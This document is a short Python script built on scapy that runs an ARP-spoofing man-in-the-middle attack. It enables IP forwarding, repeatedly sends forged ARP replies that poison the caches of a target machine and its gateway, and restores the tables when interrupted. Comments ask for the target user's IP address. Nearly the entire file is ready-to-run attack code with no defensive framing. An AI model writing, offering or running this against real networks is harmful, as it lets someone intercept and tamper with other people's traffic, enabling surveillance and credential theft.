from scapy.all import *
import os
import sys
import threading

# Enable IP forwarding
os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")

# Set the target IP addresses
target_ip = "192.168.1.100"  # Replace with the target user's IP address
gateway_ip = "192.168.1.1"   # Replace with the IP address of the network gateway

# Create and send the ARP spoofing packets
def spoof_arp():
    spoof_target = ARP()
    spoof_target.op = 2
    spoof_target.psrc = gateway_ip
    spoof_target.pdst = target_ip
    spoof_target.hwdst = "ff:ff:ff:ff:ff:ff"  # Broadcast MAC address
    send(spoof_target, verbose=0)

    spoof_gateway = ARP()
    spoof_gateway.op = 2
    spoof_gateway.psrc = target_ip
    spoof_gateway.pdst = gateway_ip
    spoof_gateway.hwdst = "ff:ff:ff:ff:ff:ff"  # Broadcast MAC address
    send(spoof_gateway, verbose=0)

# Restore the network by sending correct ARP packets
def restore_arp():
    restore_target = ARP()
    restore_target.op = 2
    restore_target.psrc = gateway_ip
    restore_target.pdst = target_ip
    restore_target.hwdst = getmacbyip(target_ip)
    send(restore_target, verbose=0)

    restore_gateway = ARP()
    restore_gateway.op = 2
    restore_gateway.psrc = target_ip
    restore_gateway.pdst = gateway_ip
    restore_gateway.hwdst = getmacbyip(gateway_ip)
    send(restore_gateway, verbose=0)

# Run the MITM attack
def mitm_attack():
    try:
        while True:
            spoof_arp()
            time.sleep(1)
    except KeyboardInterrupt:
        print("\n[+] Stopping the attack and restoring the network...")
        restore_arp()

# Start the MITM attack in a separate thread
mitm_thread = threading.Thread(target=mitm_attack)
mitm_thread.start()
